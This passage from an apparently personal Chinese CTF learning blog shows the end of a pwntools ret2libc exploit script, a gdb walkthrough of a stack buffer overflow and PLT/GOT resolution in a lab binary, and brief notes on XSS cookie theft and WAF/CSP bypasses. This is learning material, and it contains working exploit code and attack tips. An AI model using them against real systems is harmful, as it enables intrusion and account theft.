你虽然read没写这么多数据,但他会write这么多,开始这里就错了</span></div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line"></div><div class="line"><span class="comment"># 这个时候才可以接收</span></div><div class="line">resp = p.recv(<span class="number">4</span>)</div><div class="line">write_addr = u32(resp)</div><div class="line"><span class="keyword">print</span> <span class="string">'write_addr='</span> + hex(write_addr)</div><div class="line"></div><div class="line"><span class="comment"># 计算偏移地址</span></div><div class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</div><div class="line">sh_addr     = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)) )</div><div class="line"></div><div class="line">payload2  = <span class="string">''</span></div><div class="line">payload2 += <span class="string">'A'</span> * buffer_len </div><div class="line">payload2 += <span class="string">'BBBB'</span> <span class="comment"># ebp</span></div><div class="line">payload2 += p32(system_addr)  <span class="comment"># ret_addr</span></div><div class="line"></div><div class="line">payload2 += p32(vuln_addr)   <span class="comment"># 起来shell后返回到哪里已经不重要了,这里可以瞎填</span></div><div class="line">payload2 += p32(sh_addr) <span class="comment"># arg of system</span></div><div class="line"></div><div class="line">p.send(payload2)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>第一个问题就是<code>p.recv全系列</code></p>
<blockquote>
<p>recv(numb = 4096, timeout = default) → str<br>    Receives up to numb bytes of data from the tube, and returns as soon as any quantity of data is available.<br>    If the request is not satisfied before timeout seconds pass, all data is buffered and an empty string (‘’) is returned.<br>    如果达不到n个字节那将什么都得不到,那要是我的numb设置的太小呢</p>
<p>recvline(keepends = True) → str<br>    A “line” is any sequence of bytes terminated by the byte sequence set in newline, which defaults to ‘\n’.<br>    If the request is not satisfied before timeout seconds pass, all data is buffered and an empty string (‘’) is returned.<br>    如果返回的数据没有<code>\n</code>那用了<code>recvline</code>讲什么都得不到,而不是得到一部分</p>
<p>recvuntil(delims, timeout = default) → str<br>    Receive data until one of delims is encountered.<br>    If the request is not satisfied before timeout seconds pass, all data is buffered and an empty string (‘’) is returned.</p>
<p>注意:all data is buffered</p>
</blockquote>
<p>第二个问题是题目三次setbuf,就像原来自己写的程序,用到的输入输出函数,只有在遇到换行或者xxx情况才刷新缓冲区,这里不需要,所以这里的给<code>read</code>上payload的时候只要<code>p.send(payload)</code>就可以了,而不需要<code>p.sendline(payload)</code>是这个原因吗</p>
<p>第三个问题是题目开了<code>alarm(1)</code>, 1s后程序就会<code>exited on signal 14</code>,这个手根本没办法,所以把最后几行改成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">p.send(payload2)</div><div class="line"></div><div class="line">p.sendline(<span class="string">"ls"</span>)</div><div class="line"><span class="keyword">print</span> p.recvline()</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>这里用了<code>p.sendline()</code>,是和命令行交互的时候,还是不太懂要不要line</p>
<h2 id="gdb常用操作"><a href="#gdb常用操作" class="headerlink" title="gdb常用操作"></a>gdb常用操作</h2><p>start 启动程序,并且停在main的第一句</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[从负开始学汇编0]]></title>
      <url>/2017/07/22/%E4%BB%8E%E8%B4%9F%E5%BC%80%E5%A7%8B%E5%AD%A6%E6%B1%87%E7%BC%960/</url>
      <content type="html"><![CDATA[<h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><p>一句一句看一下昨天的pwn1,超简单,几行代码的</p>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">push    ebp</div><div class="line"> mov    ebp, esp</div><div class="line"> and    esp, 0FFFFFFF0h     ; 这里是对齐esp到16字节</div><div class="line"> sub    esp, 10h            ; 抬高栈顶,相当于分配了16字节空间</div><div class="line"> mov    dword ptr [esp], 1  ; 像栈里推入4字节 0x1,相当于push 1</div><div class="line"> call   _alarm              ; 调用函数alarm(1), 1是上一步分的</div></pre></td></tr></table></figure>
<p>我拿gdb调试的时候</p>
<p>我们暂停一下,这个时候的栈应该是</p>
<p>到了and这句之前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EBP: 0xffffcbe8</div><div class="line">ESP: 0xffffcbe8</div></pre></td></tr></table></figure></p>
<p>and之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EBP: 0xffffcbe8</div><div class="line">ESP: 0xffffcbe0</div></pre></td></tr></table></figure></p>
<p><code>sub esp, 0xfffffff0</code>之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EBP: 0xffffcbe8</div><div class="line">ESP: 0xffffcbd0</div></pre></td></tr></table></figure></p>
<p><code>mov DWORD PTR [esp],0x1</code>后,esp没变化<br>相当于是在栈顶<code>esp=0xffffcbd4</code>的时候执行了<code>push 0x1</code>,使得<code>esp = esp - 4</code><br><code>push xxx</code>和<code>mov DWORD PTR [esp], xxx</code>作用和区别:<br>一个会使esp变化一个不会</p>
<p>并且此时<code>x/x $esp</code>得到栈顶上的值是<code>0x01</code><br>好了,啰嗦了好多,像小学生一样</p>
<p><code>call 0x8048400</code> (IDA里看到的<code>call _alarm</code>)的时候,我们跟进看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">_alarm proc near</div><div class="line">       jmp ds:off_804A014</div><div class="line">_alarm endp</div></pre></td></tr></table></figure></p>
<p>再跟着跳过去,发现这个<code>ds:off_804A014</code>是属于<code>.got.plt</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.got.plt:0804A014  offset_804A014 dd offset alarm</div></pre></td></tr></table></figure></p>
<p>然后我们不跟着他了,我们直接到<code>alarm</code>跑完到下一句</p>
<p>这个时候我们发现栈里的数据还没清理<br>我们alarm的形参<code>0x1</code>还在栈顶丢着<br>C里函数调用默认是<code>cdel</code>,从右到左压参数,caller清理现场,可没见到清理现场啊</p>
<p>接着看下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">   0x80485a4:	call   0x8048400 &lt;alarm@plt&gt;</div><div class="line">=&gt; 0x80485a9:	mov    eax,ds:0x804a044 ;这句的0x804a044在IDa里是STDIN</div><div class="line">   0x80485ae:	mov    DWORD PTR [esp+0x4],0xxxxxx0h    ;0</div><div class="line">   0x80485b6:	mov    DWORD PTR [esp],eax  ;STDIN</div><div class="line">   0x80485b9:	call   0x80483e0 &lt;setbuf@plt&gt;   ; setbuf(STDIN, 0)</div><div class="line">   0x80485be:	mov    eax,ds:0x804a060</div></pre></td></tr></table></figure></p>
<p>我们跑过压参数的这两句,然后stack里是这样子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0000| 0xffffcbd0 --&gt; 0xf7f9a5a0</div><div class="line">0004| 0xffffcbd4 --&gt; 0x0</div></pre></td></tr></table></figure></p>
<p>我装的是peda插件,最左边是相对于esp偏移(十进制的),偏移越小肯定是离栈顶越近咯<br>可以看到原来的栈顶<code>0xffffcbd0</code>这里存的是<code>0x1</code>来着<br>诶?看这个样子被调用者自己清理了栈???这个形参算是caller的还是calle的啊</p>
<p>跟一下<code>setbuf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">=&gt; 0xf7e4dff0 &lt;setbuf&gt;:	sub    esp,0x10</div><div class="line">   0xf7e4dff3 &lt;setbuf+3&gt;:	push   0x2000</div><div class="line">   0xf7e4dff8 &lt;setbuf+8&gt;:	push   DWORD PTR [esp+0x1c]</div><div class="line">   0xf7e4dffc &lt;setbuf+12&gt;:	push   DWORD PTR [esp+0x1c]</div><div class="line">   0xf7e4e000 &lt;setbuf+16&gt;:	call   0xf7e48210 &lt;setbuffer&gt;</div><div class="line">   0xf7e4e005 &lt;setbuf+21&gt;:	add    esp,0x1c</div><div class="line">   0xf7e4e008 &lt;setbuf+24&gt;:	ret</div></pre></td></tr></table></figure></p>
<p>有点迷…..</p>
<p>喝了口水,反应过来是这样子的,前面看到的几个函数都是<code>glibc</code>里提供的…<br>这里有一个延迟加载的措施,其实比较复杂,我们进入到的这个<code>setbuf</code>,只是<code>glibc</code>里的一个跳台,这个帮真正的<code>setbuf</code>把参数压进去,然后才调到真正起作用的<code>setbuffer</code></p>
<p>这里的<code>setbuf</code>调用<code>setbuffer</code>的地方倒是像是<code>cdel</code><br>先从坐到右参数压了栈<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0000| 0xffffcbb0 --&gt; 0xf7f9a5a0 ;STDIN</div><div class="line">0004| 0xffffcbb4 --&gt; 0x0    ; 0</div><div class="line">0008| 0xffffcbb8 --&gt; 0x2000 ; 不知道是啥</div></pre></td></tr></table></figure></p>
<p>然后调<code>setbuffer</code><br>最后调用之后<code>add esp, 0x1c</code> 对应原来的<code>sub esp, 0x10</code><br>很明显这多出来的<code>0x0c</code>是caller<code>setbuf</code>对堆栈的清理<br>把给callee<code>setbuffer</code>传的三个参数给清理掉</p>
<p>再跟一下<code>stebuffer</code>,发现和我们想的是一样的了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0000| 0xffffcbac --&gt; 0xf7e4e005  ;ret_addr</div><div class="line">0004| 0xffffcbb0 --&gt; 0xf7f9a5a0  ;arg1</div><div class="line">0008| 0xffffcbb4 --&gt; 0x0         ;arg2</div><div class="line">0012| 0xffffcbb8 --&gt; 0x2000 (&apos;&apos;) ;arg3</div></pre></td></tr></table></figure></p>
<p>下面是<code>0xf7e4e005</code>的具体逻辑就不看了<br>我们直接跳出<code>setbuffer</code>, 跳出<code>setbuf</code><br>回来<code>main</code>里</p>
<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><p>别看到返回地址就打断点,那个返回地址是栈里的,你没法打断<br>打断点好像只能在<code>.text段</code></p>
<p>callee清理栈方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ret n</div></pre></td></tr></table></figure></p>
<p>caller清理栈方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add esp, 0x0c</div></pre></td></tr></table></figure></p>
<p>我们回到main,下面又是两个一毛一样的<code>stebuf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">=&gt; 0x80485be:	mov    eax,ds:0x804a060</div><div class="line">   0x80485c3:	mov    DWORD PTR [esp+0x4],0x0</div><div class="line">   0x80485cb:	mov    DWORD PTR [esp],eax</div><div class="line">   0x80485ce:	call   0x80483e0 &lt;setbuf@plt&gt; ; setbuf(sdout, 0)</div><div class="line">   0x80485d3:	mov    eax,ds:0x804a040</div><div class="line">   0x80485d8:	mov    DWORD PTR [esp+0x4],0x0</div><div class="line">   0x80485e0:	mov    DWORD PTR [esp],eax</div><div class="line">   0x80485e3:	call   0x80483e0 &lt;setbuf@plt&gt; ; setbuf(stderror, 0)</div><div class="line">   0x80485e8:	mov    DWORD PTR [esp],0x8048690 ; &quot;puts your name:&quot;</div><div class="line">   0x80485ef:	call   0x8048410 &lt;puts@plt&gt; ;puts(&quot;puts your name&quot;)</div></pre></td></tr></table></figure></p>
<p>这里也看清楚了call的是<code>&lt;setbuf@plt&gt;</code><br>其实读代码大概是这样子的<br>诶,我有个疑问,这个代码怎么感觉和我调试的不太一样啊,我看蠢了等下</p>
<p>先看下main这里的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/10i 0x8048594</div><div class="line">   0x8048594:	push   ebp</div><div class="line">   0x8048595:	mov    ebp,esp</div><div class="line">   0x8048597:	and    esp,0xfffffff0</div><div class="line">   0x804859a:	sub    esp,0x10</div><div class="line">   0x804859d:	mov    DWORD PTR [esp],0x1</div><div class="line">   0x80485a4:	call   0x8048400 &lt;alarm@plt&gt;</div><div class="line">   0x80485a9:	mov    eax,ds:0x804a044</div><div class="line">   0x80485ae:	mov    DWORD PTR [esp+0x4],0x0</div><div class="line">   0x80485b6:	mov    DWORD PTR [esp],eax</div><div class="line">   0x80485b9:	call   0x80483e0 &lt;setbuf@plt&gt;</div></pre></td></tr></table></figure></p>
<p>然后跟着过去看下<code>call   0x80483e0 &lt;setbuf@plt&gt;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/10i 0x80483e0</div><div class="line">   0x80483e0 &lt;setbuf@plt&gt;:	jmp    DWORD PTR ds:0x804a00c</div><div class="line">   0x80483e6 &lt;setbuf@plt+6&gt;:	push   0x0</div><div class="line">   0x80483eb &lt;setbuf@plt+11&gt;:	jmp    0x80483d0</div></pre></td></tr></table></figure></p>
<p>大概是这样子的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">+----------------+-------------------+-----------</div><div class="line">    ELF               PLT表             GOT表</div><div class="line">+----------------+-------------------+----------</div><div class="line">call &lt;setbuf@plt&gt; =&gt;  jmp *0x804a00c =&gt;</div></pre></td></tr></table></figure>
<p>这个plt是不允许写的,但这个GOT很明显是可以写的,但如果动态链接的话,在你编译的时候没法确定这个你要调用的库函数的地址,所以很明显这个GOT很明显开始放的不是真正的setbuf的地址</p>
<p>准确的说是,在setbuf第一次调用的时候,setbuf的got表项<code>&lt;setbuf@got.plt&gt;</code>里存的是<code>&lt;setbuf@plt+6&gt;</code>的地址,现在看看我们的<code>plt表</code>,是不是发现有三条<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x80483e0 &lt;setbuf@plt&gt;:	jmp    DWORD PTR ds:0x804a00c</div><div class="line">0x80483e6 &lt;setbuf@plt+6&gt;:	push   0x0</div><div class="line">0x80483eb &lt;setbuf@plt+11&gt;:	jmp    0x80483d0</div></pre></td></tr></table></figure></p>
<p>这个我们会从<code>&lt;setbuf@got.plt&gt;</code>调到这个<code>&lt;setbuf@plt+6&gt;</code>,然后走到<code>&lt;setbuf@plt+11&gt;</code>,这里会jmp一下,jmp到哪里了呢,我们看下<code>0x80483d0</code>这个地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/10i 0x80483d0</div><div class="line">   0x80483d0:	push   DWORD PTR ds:0x804a004</div><div class="line">   0x80483d6:	jmp    DWORD PTR ds:0x804a008   ;jmp *0x804a008 不是 jmp 0x0804a008</div><div class="line">   0x80483dc:	add    BYTE PTR [eax],al</div><div class="line">   0x80483de:	add    BYTE PTR [eax],al</div><div class="line"></div><div class="line">   0x80483e0 &lt;setbuf@plt&gt;:	jmp    DWORD PTR ds:0x804a00c</div><div class="line">   0x80483e6 &lt;setbuf@plt+6&gt;:	push   0x0</div><div class="line">   0x80483eb &lt;setbuf@plt+11&gt;:	jmp    0x80483d0</div><div class="line"></div><div class="line">   0x80483f0 &lt;read@plt&gt;:	jmp    DWORD PTR ds:0x804a010</div><div class="line">   0x80483f6 &lt;read@plt+6&gt;:	push   0x8</div><div class="line">   0x80483fb &lt;read@plt+11&gt;:	jmp    0x80483d0</div></pre></td></tr></table></figure></p>
<p>跳到了这个其实是<code>plt</code>表的开头,你可以发现<br>这个<code>plt</code>除了最开始的两句算是公共的表项,剩下的每个函数对应三句话,第三局都是跳转到plt表的开头,之后应该是又跳到什么地方然后把对应的GOT标表项改过来了就完结了吧</p>
<p>大概是这样子<br>setbuf第一次调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">main =&gt; &lt;setbuf@plt&gt; =&gt; &lt;setbuf@got.plt&gt; =&gt; &lt;setbuf@plt+6&gt; =&gt; &lt;setbuf@plt+11&gt; =&gt; plt表首 =&gt; 然后不知道经过了啥 =&gt; &lt;setbuf@got.plt&gt;里填上了真的setbuf的地址</div></pre></td></tr></table></figure></p>
<p>拿出来我的小书书查了下这个不知道经过啥其实是在<code>plt</code>表首jmp到了一下<code>_dl_runtime_resolve()</code>,函数完成了地址绑定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/10i *0x804a008 ;注意是取出jmp * ,别把星号丢了</div><div class="line">   0xf7fedf00:	push   eax</div><div class="line">   0xf7fedf01:	push   ecx</div><div class="line">   0xf7fedf02:	push   edx</div><div class="line">   0xf7fedf03:	mov    edx,DWORD PTR [esp+0x10]</div><div class="line">   0xf7fedf07:	mov    eax,DWORD PTR [esp+0xc]</div></pre></td></tr></table></figure></p>
<p>上网查了下这一段确实是<code>_dl_runtime_resolve()</code>的源码<br>还有补充说是<code>.got.plt</code>的前三项(每一项4字节)代表的分别是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x804a000:	0x08049f14      ; .dynamic段地址</div><div class="line">0x804a004:  0xf7ffd918      ; module_id</div><div class="line">0x804a008:  0xf7fedf00      ; dl_runtime_resolve地址</div></pre></td></tr></table></figure></p>
<p>setbuf第n次调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">main =&gt; &lt;setbuf@plt&gt; =&gt; &lt;setbuf@got.plt&gt; =&gt; 成功调用</div></pre></td></tr></table></figure></p>
<p>好吧,动态绑定这一块好像都搞清楚了<br>刚说到哪里了,对.我们走走走,回到了main里,我们刚刚是调用了puts<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">=&gt; 0x80485ef:	call   0x8048410 &lt;puts@plt&gt;</div><div class="line">   0x80485f4:	call   0x804854d</div><div class="line">   0x80485f9:	mov    eax,0x0</div><div class="line">   0x80485fe:	leave  </div><div class="line">   0x80485ff:	ret</div></pre></td></tr></table></figure></p>
<p>我们看<code>0x0804854d</code>这里调用了什么函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">=&gt; 0x804854d:	push   ebp</div><div class="line">   0x804854e:	mov    ebp,esp</div><div class="line">   0x8048550:	sub    esp,0x98         ; 栈抬高0x98 =&gt; old_esp = esp + 0x98</div><div class="line">   0x8048556:	mov    DWORD PTR [esp+0x8],0x100    ; 这个是后面要调用的函数的arg3</div><div class="line">   0x804855e:	lea    eax,[ebp-0x88]   ; 这个时候[ebp-0x88]相当于[old_esp - 0x88] =&gt; [esp + 0x10] ; 其实这个换算了也没啥意思,因为是lea,传地址,用谁算都一样</div><div class="line">   ; 我的$esp =  0xffffcb30 , 所以这句之后$eax = 0xffffcb30 + 0x10 = 0xffffcb40</div></pre></td></tr></table></figure></p>
<p><code>mov ebp, esp</code>后,栈里的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0000 0xffffcbc8 --&gt; 0xffffcbe8      ;ebp</div><div class="line">0004 0xffffcbcc --&gt; 0x80485f9       ;ret_addr</div></pre></td></tr></table></figure></p>
<p>再接着看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">   0x804855e:	lea    eax,[ebp-0x88]               ; $eax = 0xffffcb40</div><div class="line">=&gt; 0x8048564:	mov    DWORD PTR [esp+0x4],eax      ; arg2 = $eax</div><div class="line">   0x8048568:	mov    DWORD PTR [esp],0x0          ; arg1 = 0x0</div><div class="line">   0x804856f:	call   0x80483f0 &lt;read@plt&gt;         ; read(0x0, 0xffffcb40, 0x100)</div><div class="line">   0x8048574:	mov    DWORD PTR [esp+0x8],0x100</div><div class="line">   0x804857c:	lea    eax,[ebp-0x88]</div></pre></td></tr></table></figure></p>
<p>看到这里,发现是给调用了<code>read</code>,其实这里的<code>arg2</code>的值是什么不重要,重要的是他是<code>[ebp-0x88]</code>,就是说他离<code>ebp</code>有<code>0x88</code>的距离,大概是这样子<br>压完3个参数,但还没call之前栈里大概是这样子的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0xffffcb30  +----------------------+  [esp] = arg1 </div><div class="line">                arg1 [0x0]</div><div class="line">0xffffcb34  +----------------------+  [esp+0x4] = arg2</div><div class="line">                arg2 [0xffffcb40] -------------------------------+</div><div class="line">0xffffcb38  +----------------------+  [esp+0x8] = arg3           |</div><div class="line">                arg3 [0x100]                                     |</div><div class="line">0xffffcb40  +----------------------+  [esp+0x10]                 |</div><div class="line">               0x88个字节的缓冲区  &lt;-----------------------------+</div><div class="line">0xffffcbc8  +----------------------+  [esp+0x98] [ebp]; 开始抬起来0x98</div><div class="line">                EBP</div><div class="line">0xffffcbcc  +----------------------+  [esp+0x9c] </div><div class="line">                ret_addr</div><div class="line">0xffffcbd0  +----------------------+  [esp+0x100]</div></pre></td></tr></table></figure></p>
<p>这样子写入地址距离ebp是0x88,但read可写入0x100的数据,这样子我们就能覆盖到返回地址<code>ret_addr</code></p>
<p>理论上我们只要构造<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"print 0x88 * 'A' + 'ABCD' + our_ret_addr"</span></div></pre></td></tr></table></figure></p>
<p>就能填满0x88大小的缓冲区,用<code>ABCD</code>覆盖4字节的EBP,然后更改返回地址</p>
<p>然后我们查了一下checksec<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure></p>
<p>发现开了<code>NX</code>,堆栈不可执行,所以我们,可以使用<code>ret2libc</code>的方法<br>不知道为什么这题到了<code>read</code>这里没有提示我输入…</p>
<p>所以我是<code>start &lt; in.data</code>这样子调试的,确认了一下,这个字节数是正确的</p>
<p>然后写完poc发现不能用,这个时候上网查找了一下,pwntools有启<code>gdb</code>的功能,让我试试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./pwn1'</span>)</div><div class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</div><div class="line">gdb.attach(p)</div></pre></td></tr></table></figure>
<p>简直不能太赞,但似乎,有一点问题,我怎么让停在第一句呢,去翻了翻官网</p>
<blockquote>
<p>Attaching to processes with attach() is useful, but the state the process is in may vary. If you need to attach to a process very early, and debug it from the very first instruction (or even the start of main), you instead should use debug()</p>
</blockquote>
<p>哦,我不应该用attach,应该是用<code>gdb.debug()</code><br>差不多,是这样子的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</div><div class="line">    p = gdb.debug(<span class="string">'/home/haibin/nsctf/pwn/pwn1'</span>,<span class="string">'''</span></div><div class="line"><span class="string">    start</span></div><div class="line"><span class="string">    continue</span></div><div class="line"><span class="string">    '''</span>) </div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">6666</span>)</div></pre></td></tr></table></figure></p>
<p>试了好多次,好像这里必须写成<code>start continue</code>才会刚好停在<code>main</code>的入口处…别的要不报错,要不停的太远…吐血<br>不过这个半路就GG了,连接被重置,气死了…<br>迷之.因为我payload没写完,这个时候我在最后加了一句<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>突然发现都好了…醉了<br>大概是明白了,脚本执行完之后就会断开,这里加了这句,拖住了他???<br>这样子好像行不通….这个<code>p.interactive()</code>会拖住脚本的运行<br>把他加在最后面的话,前面的脚本还是相当于都执行完了,而如果把他加在最前面那相当于这句话之后的脚本都不执行了…</p>
<p>心碎,要睡一觉</p>
<p>代码里有一个leave指令其实相当于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov esp, ebp</div><div class="line">pop ebp</div></pre></td></tr></table></figure></p>
<p>当然这个<code>pop ebp</code>之后,<code>esp</code>又会<code>esp+4</code>对吧</p>
<h3 id="关于调用规约"><a href="#关于调用规约" class="headerlink" title="关于调用规约"></a>关于调用规约</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">__cdecl       caller清理参数,右向左入栈</div><div class="line">__stdcall     callee清理参数,右向左入栈</div><div class="line">__fastcall    callee清理参数,前两个参数寄存器传参数,其余右向左压入栈</div></pre></td></tr></table></figure>
<p>fastcall寄存器传参,所以叫fast,使用高性能场合<br>可变长参数函数只能使用<code>__cdecl</code>,网上的解释是说只有调用者才知道传入了多少参数,以用来清理参数,回收栈空间,这个理由没法说服我,也许是我没有完全理解</p>
<p>另外<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> WINAPI     __stdcall</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[阶段性总结]]></title>
      <url>/2017/07/20/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>整个注入就是通过闭合原来的语句或者去他方式来改变原来的逻辑</p>
<h3 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h3><p>主要是窃取管理员cookie,然后盗取身份</p>
<p>同源策略[SOP]</p>
<ul>
<li>web SOP<ul>
<li>端口号</li>
<li>协议</li>
<li>domain</li>
</ul>
</li>
<li>cookie SOP<ul>
<li>domain</li>
<li>path</li>
</ul>
</li>
<li>跨域<ul>
<li>window.name</li>
<li>JSONP</li>
<li>PostMessage</li>
</ul>
</li>
<li>同源绕过<ul>
<li>特定软件比如JAVA，FLASH</li>
</ul>
</li>
</ul>
<p>bypass WAF</p>
<ul>
<li>eval还有的话,String.fromCharCode还是很稳的</li>
<li>带src的都可以</li>
<li>window.location跳转一波</li>
</ul>
<p>bypass CSP</p>
<ul>
<li>link prefetch(跨域) + ajax(需要unsafe inline)</li>
<li>sourceMapUrl(跨域)</li>
</ul>
<p>bypass sandbox</p>
<ul>
<li>用iframe的函数</li>
</ul>
<p>小trick</p>
<ul>
<li>获取其他路径下的cookie，通过一个iframe</li>
</ul>
<p>还有蠕虫</p>
